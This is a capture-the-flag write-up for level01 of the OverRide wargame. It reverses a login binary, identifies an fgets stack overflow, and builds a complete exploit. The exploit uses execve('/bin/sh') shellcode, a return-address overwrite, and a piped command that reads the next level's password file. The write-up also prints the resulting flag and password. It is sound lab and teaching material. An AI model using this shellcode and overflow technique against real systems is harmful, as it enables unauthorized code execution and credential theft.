# level01

For this level, I start the same way as level00: extract the binary and inspect
it in Binary Ninja.

## What Binary Ninja does here

Binary Ninja reads the compiled ELF binary and rebuilds readable pseudo-C from
the assembly. This makes it easier to identify functions, calls, local
variables, string references, branches, and the general program flow.

## Get the binary

First read the password obtained from level00 on the host machine:

```sh
cat level00/flag
```

Connect to the VM as the next user:

```sh
ssh level01@127.0.0.1 -p 2222
```

When SSH asks for a password, paste the content of `level00/flag`.

After login, the prompt should look like:

```text
level01@OverRide:~$
```

From the host machine, copy the `level01` binary from the VM:

```sh
scp -P 2222 level01@127.0.0.1:/home/users/level01/level01 ./level01/level01
```

This `scp` command asks for the same password from `level00/flag`.

The local binary for analysis should be:

```text
level01/level01
```

Open this file in [Binary Ninja](https://cloud.binary.ninja/).

## Start the analysis

In Binary Ninja:

1. Open `level01`.
2. Wait for analysis to finish.
3. Look at the symbol list.
4. Find `main`.
5. Use the decompiler view or Linear Disassembly.

## What `main` shows

Binary Ninja gives this high-level structure:

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    void buf;

    __builtin_memset(&buf, 0, 0x40);
    int32_t var_14 = 0;

    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(&a_user_name, 0x100, stdin);

    if (verify_user_name())
    {
        puts("nope, incorrect username...\n");
        return 1;
    }

    puts("Enter Password: ");
    fgets(&buf, 0x64, stdin);

    int32_t eax_2 = verify_user_pass(&buf);

    if (eax_2 && !eax_2)
        return 0;

    puts("nope, incorrect password...\n");
    return 1;
}
```

The important points for now:

- `main` reads a username into the global `a_user_name`.
- It calls `verify_user_name()`.
- If the username check fails, the program exits.
- Then it reads a password into a local buffer.
- It calls `verify_user_pass(&buf)`.

So the next functions to inspect in Binary Ninja are:

```text
verify_user_name
verify_user_pass
```

## `verify_user_name`

Binary Ninja shows that this function compares the global username buffer with
the string `dat_wil`.

Relevant decompiled structure:

```c
int32_t verify_user_name()
{
    puts("verifying username....\n");

    int32_t i = 7;
    char* esi = &a_user_name;
    char* edi = "dat_wil";

    while (i)
    {
        char temp1 = *esi;
        char temp2 = *edi;

        esi = &esi[1];
        edi = &edi[1];
        i -= 1;

        if (temp1 != temp2)
            break;
    }

    return /* strcmp-like result */;
}
```

Important point:

```text
username is compared with "dat_wil"
```

## `verify_user_pass`

Binary Ninja shows a similar comparison for the password. The function receives
the password buffer as `arg1` and compares it with the string `admin`.

Relevant decompiled structure:

```c
int32_t verify_user_pass(char* arg1)
{
    int32_t i = 5;
    char* esi = arg1;
    char* edi = "admin";

    while (i)
    {
        char temp1 = *esi;
        char temp2 = *edi;

        esi = &esi[1];
        edi = &edi[1];
        i -= 1;

        if (temp1 != temp2)
            break;
    }

    return /* strcmp-like result */;
}
```

Important point:

```text
password is compared with "admin"
```

## Current conclusion

At this stage, Binary Ninja shows these comparison strings:

```text
username: dat_wil
password: admin
```

Testing them:

```sh
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...
```

So `dat_wil` is the correct username, but `admin` does not give access through
the normal password path.

The suspicious part is in `main`:

```c
int32_t eax_2 = verify_user_pass(&buf);

if (eax_2 && !eax_2)
    return 0;
```

This condition cannot be true: a value cannot be both non-zero and zero at the
same time. In practice, the program always reaches:

```c
puts("nope, incorrect password...\n");
return 1;
```

This means the next step is not to find a normal password. The next thing to
inspect is the password input buffer:

```c
void buf;
__builtin_memset(&buf, 0, 0x40);
fgets(&buf, 0x64, stdin);
```

`buf` is initialized as `0x40` bytes, but `fgets` can read `0x64` bytes. That
suggests the password input may overflow the local buffer.

## Exploitation strategy

There are two reads from the same standard input stream:

```c
fgets(&a_user_name, 0x100, stdin);
fgets(&buf, 0x64, stdin);
```

The first `fgets` can consume at most `0x100 - 1`, or 255 bytes. If the input
does not contain a newline in those first 255 bytes, the bytes left in the
stream are consumed by the second `fgets`.

This lets us build one continuous payload:

```text
username + shellcode + padding + overwritten EIP
```

The first 255 bytes are stored in the global username buffer. The remaining
bytes are read into the vulnerable password buffer.

## Find the cyclic offset

Start the payload with the required username, fill the rest of the first input,
then append a cyclic pattern in gdb:

```gdb
r < <(python -c 'print "dat_wil" + "\x90" * (256 - 7) + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"')
```

The crash gives:

```text
Program received signal SIGSEGV, Segmentation fault.
0x63413663 in ?? ()
```

Searching this value in the cyclic pattern gives:

```text
79
```

The pattern offset is 79 because one byte from the 256-byte prefix remains
after the first `fgets` consumes its maximum of 255 bytes. Therefore the second
`fgets` receives:

```text
1 leftover byte + 79 pattern bytes + overwritten EIP
```

This agrees with the earlier result that saved EIP is reached after 80 bytes in
the second buffer.

## Store the shellcode

Use this 21-byte `execve("/bin/sh")` shellcode:

```text
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
```

Equivalent x86 instructions:

```asm
xor  ecx, ecx        ; ecx = 0
mul  ecx             ; eax = 0 and edx = 0
mov  al, 0x0b        ; Linux syscall 11: execve
push ecx             ; null terminator
push 0x68732f2f      ; "//sh"
push 0x6e69622f      ; "/bin"
mov  ebx, esp        ; ebx points to "/bin//sh"
int  0x80            ; execute the syscall
```

For 32-bit Linux, `execve` expects:

```text
eax = 11          syscall number
ebx = "/bin//sh" filename
ecx = 0           argv
edx = 0           envp
```

The shellcode avoids null bytes inside the injected byte sequence because a
null byte could terminate string-based input handling before the full payload
is copied.

The global username buffer starts at:

```text
0x0804a040
```

The first seven bytes must contain `dat_wil`. The shellcode begins immediately
afterward, at:

```text
0x0804a040 + 7 = 0x0804a047
```

On x86, the address must be written in little-endian byte order:

```text
0x0804a047 -> \x47\xa0\x04\x08
```

The expression below starts with the address in normal byte order and reverses
it:

```python
"\x08\x04\xa0\x47"[::-1]
```

## Final exploit

The padding calculation is:

```python
padding = "X" * (256 - len(user + shellcode) + 79)
```

Why:

- `256 - len(user + shellcode)` fills the first-input region.
- `+ 79` reaches saved EIP after the one byte left by the first `fgets`.
- the final four bytes replace saved EIP with `0x0804a047`.

Run:

```sh
(python -c '''
user = "dat_wil"
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
padding = "X" * (256 - len(user + shellcode) + 79)

print user + shellcode + padding + "\x08\x04\xa0\x47"[::-1]
'''; echo 'cat /home/users/level02/.pass') | ./level01
```

The username check reads `dat_wil`, the shellcode remains in `a_user_name`, the
second `fgets` overflows saved EIP, and execution returns to the shellcode at
`0x0804a047`.

The flag is:

```text
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

You can now acces to level02:

```sh
ssh level02@127.0.0.1 -p 2222
password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
